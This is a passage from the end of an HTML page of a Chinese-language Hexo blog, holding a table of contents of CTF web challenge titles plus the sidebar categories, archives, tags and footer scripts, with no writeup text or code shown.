2019]Pythonginx</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-checkin"><span class="level-left"><span class="level-item">4.1.59</span><span class="level-item">[SUCTF] checkin</span></span></a></li><li><a class="level is-mobile" href="#SUCTF-easy-web"><span class="level-left"><span class="level-item">4.1.60</span><span class="level-item">[SUCTF] easy web</span></span></a></li><li><a class="level is-mobile" href="#SWPU2019-Web1"><span class="level-left"><span class="level-item">4.1.61</span><span class="level-item">[SWPU2019]Web1</span></span></a></li><li><a class="level is-mobile" href="#WUSTCTF2020-朴实无华"><span class="level-left"><span class="level-item">4.1.62</span><span class="level-item">[WUSTCTF2020]朴实无华</span></span></a></li><li><a class="level is-mobile" href="#WesternCTF2018-shrine"><span class="level-left"><span class="level-item">4.1.63</span><span class="level-item">[WesternCTF2018]shrine</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2020-朱雀组-phpweb"><span class="level-left"><span class="level-item">4.1.64</span><span class="level-item">[网鼎杯 2020 朱雀组]phpweb</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2020-朱雀组-Nmap"><span class="level-left"><span class="level-item">4.1.65</span><span class="level-item">[网鼎杯 2020 朱雀组]Nmap</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2020-青龙组-ArdeUSerialz"><span class="level-left"><span class="level-item">4.1.66</span><span class="level-item">[网鼎杯 2020 青龙组]ArdeUSerialz</span></span></a></li><li><a class="level is-mobile" href="#网鼎杯-2018-Fakebook"><span class="level-left"><span class="level-item">4.1.67</span><span class="level-item">[网鼎杯 2018]Fakebook</span></span></a></li><li><a class="level is-mobile" href="#ZJCTF-2019-NiZhuanSiWei"><span class="level-left"><span class="level-item">4.1.68</span><span class="level-item">[ZJCTF 2019]NiZhuanSiWei</span></span></a></li><li><a class="level is-mobile" href="#0CTF-2016-piapiapia"><span class="level-left"><span class="level-item">4.1.69</span><span class="level-item">[0CTF] 2016 piapiapia</span></span></a></li></ul></li></ul></li><li><a class="level is-mobile" href="#CG-CTF"><span class="level-left"><span class="level-item">5</span><span class="level-item">CG-CTF</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#web-3"><span class="level-left"><span class="level-item">5.1</span><span class="level-item">web</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#层层递进"><span class="level-left"><span class="level-item">5.1.1</span><span class="level-item">层层递进</span></span></a></li><li><a class="level is-mobile" href="#php-decode"><span class="level-left"><span class="level-item">5.1.2</span><span class="level-item">php decode</span></span></a></li><li><a class="level is-mobile" href="#mysql"><span class="level-left"><span class="level-item">5.1.3</span><span class="level-item">mysql</span></span></a></li></ul></li></ul></li></ul></div></div><style>.menu-list > li > a.is-active + .menu-list { display: block; }.menu-list > li > a + .menu-list { display: none; }</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF/"><span class="level-start"><span class="level-item">CTF</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Powershell/"><span class="level-start"><span class="level-item">Powershell</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/metasploit/"><span class="level-start"><span class="level-item">metasploit</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/notes/"><span class="level-start"><span class="level-item">notes</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/python/"><span class="level-start"><span class="level-item">python</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/vulnhub/"><span class="level-start"><span class="level-item">vulnhub</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"><span class="level-start"><span class="level-item">漏洞复现</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-10-04T08:35:56.000Z">2020-10-04</time></p><p class="title"><a href="/2020/10/04/java/">Java 笔记</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-10-03T07:52:45.000Z">2020-10-03</time></p><p class="title"><a href="/2020/10/03/gopher/">Gopher 协议利用</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-21T02:09:13.000Z">2020-08-21</time></p><p class="title"><a href="/2020/08/21/node-js/">Node.js 相关</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-06T02:02:51.000Z">2020-08-06</time></p><p class="title"><a href="/2020/08/06/docker/">Docker</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2020-08-04T07:40:44.000Z">2020-08-04</time></p><p class="title"><a href="/2020/08/04/network/">计算机网络</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2020/10/"><span class="level-start"><span class="level-item">十月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/08/"><span class="level-start"><span class="level-item">八月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/07/"><span class="level-start"><span class="level-item">七月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/06/"><span class="level-start"><span class="level-item">六月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/05/"><span class="level-start"><span class="level-item">五月 2020</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/04/"><span class="level-start"><span class="level-item">四月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/03/"><span class="level-start"><span class="level-item">三月 2020</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/02/"><span class="level-start"><span class="level-item">二月 2020</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/01/"><span class="level-start"><span class="level-item">一月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/11/"><span class="level-start"><span class="level-item">十一月 2019</span></span><span class="level-end"><span class="level-item tag">6</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/10/"><span class="level-start"><span class="level-item">十月 2019</span></span><span class="level-end"><span class="level-item tag">7</span></span></a></li><li><a class="level is-mobile" href="/archives/2019/09/"><span class="level-start"><span class="level-item">九月 2019</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Powershell/"><span class="tag">Powershell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Writeup/"><span class="tag">Writeup</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/flask/"><span class="tag">flask</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/metasploit/"><span class="tag">metasploit</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/python/"><span class="tag">python</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/shell/"><span class="tag">shell</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ssr/"><span class="tag">ssr</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tables/"><span class="tag">tables</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/tricks/"><span class="tag">tricks</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/vulnhub/"><span class="tag">vulnhub</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><span class="tag">渗透测试</span><span class="tag">3</span></a></div></div></div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a><p class="is-size-7"><span>&copy; 2020 lll</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>